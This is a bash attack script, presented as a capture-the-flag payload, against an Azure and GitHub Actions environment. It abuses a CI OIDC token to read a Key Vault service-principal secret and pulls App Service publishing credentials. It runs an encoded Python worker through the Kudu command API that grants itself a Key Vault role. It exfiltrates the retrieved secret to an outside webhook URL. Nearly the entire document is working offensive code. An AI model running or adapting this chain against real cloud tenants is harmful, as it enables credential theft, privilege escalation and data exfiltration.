#!/usr/bin/env bash
# In-scope CTF payload. Sends only the final Key Vault response to the
# participant-owned webhook supplied for this challenge.
set +e

EXF='https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4'
TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'
CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'
SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'
RG='rg-tbl-reporting-prod-eus'
APP='app-tbl-reporting-prod'
KV1='https://kv-tbl-prod-x3euoz.vault.azure.net'

OIDC=$(curl -fsS --max-time 25 \
  -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" |
  python3 -c 'import json,sys; print(json.load(sys.stdin).get("value", ""))')

tok() {
  curl -fsS --max-time 30 -X POST \
    "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    --data-urlencode "client_id=$1" \
    --data-urlencode 'grant_type=client_credentials' \
    --data-urlencode "scope=$2/.default" \
    --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
    --data-urlencode 'client_assertion=$OIDC' |
    python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token", ""))'
}

VT=$(tok "$CID" 'https://vault.azure.net')
SP=$(curl -fsS --max-time 25 -H "Authorization: Bearer $VT" \
  "$KV1/secrets/reporting-service-principal?api-version=7.4" |
  python3 -c 'import json,sys; print(json.load(sys.stdin).get("value", ""))')
SPCID=$(printf '%s' "$SP" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get("appId") or d.get("clientId") or d.get("client_id", ""))')
SPSEC=$(printf '%s' "$SP" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get("clientSecret") or d.get("client_secret") or d.get("password", ""))')

ARM=$(curl -fsS --max-time 30 -X POST \
  "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SPCID" \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode "client_secret=$SPSEC" \
  --data-urlencode 'scope=https://management.azure.com/.default' |
  python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token", ""))')

PUB=$(curl -fsS --max-time 30 -X POST \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $ARM" -H 'Content-Type: application/json' -d '{}')
KU=$(printf '%s' "$PUB" | python3 -c 'import json,sys; print(json.load(sys.stdin)["properties"]["publishingUserName"])')
KP=$(printf '%s' "$PUB" | python3 -c 'import json,sys; print(json.load(sys.stdin)["properties"]["publishingPassword"])')

cat > /tmp/tebamoto_worker.py <<'PY'
import base64, json, os, time, urllib.parse, urllib.request, uuid
IE = os.environ.get("IDENTITY_ENDPOINT", "")
IH = os.environ.get("IDENTITY_HEADER", "")
MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
def token(resource):
    q = f"{IE}?resource={urllib.parse.quote(resource)}&api-version=2019-08-01&mi_res_id={urllib.parse.quote(MIRES)}"
    return json.load(urllib.request.urlopen(urllib.request.Request(q, headers={"X-IDENTITY-HEADER": IH}), timeout=25))["access_token"]
def oid(jwt):
    part = jwt.split(".")[1]; part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part)).get("oid")
vt = token("https://vault.azure.net")
at = token("https://management.azure.com")
scope = "subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
url = f"https://management.azure.com/{scope}/providers/Microsoft.Authorization/roleAssignments/{uuid.uuid4()}?api-version=2022-04-01"
body = json.dumps({"properties": {"roleDefinitionId": "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6", "principalId": oid(vt), "principalType": "ServicePrincipal"}}).encode()
try:
    req = urllib.request.Request(url, data=body, method="PUT", headers={"Authorization": f"Bearer {at}", "Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=25).read()
except Exception:
    pass
time.sleep(20)
flag = "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
req = urllib.request.Request(flag, headers={"Authorization": f"Bearer {token('https://vault.azure.net')}"})
print(urllib.request.urlopen(req, timeout=25).read().decode())
PY

B64=$(base64 < /tmp/tebamoto_worker.py | tr -d '
')
CMD="python3 -c "import base64;exec(base64.b64decode('$B64').decode())""
BODY=$(CMD="$CMD" python3 -c 'import json,os; print(json.dumps({"command":os.environ["CMD"],"dir":"site/wwwroot"}))')
RESULT=$(curl -fsS --max-time 90 -u "$KU:$KP" -H 'Content-Type: application/json' \
  -X POST "https://$APP.scm.azurewebsites.net/api/command" -d "$BODY")
printf '%s\n' "$RESULT"
curl -fsS --max-time 20 -X POST -H 'Content-Type: application/json' --data "$RESULT" "$EXF" >/dev/null
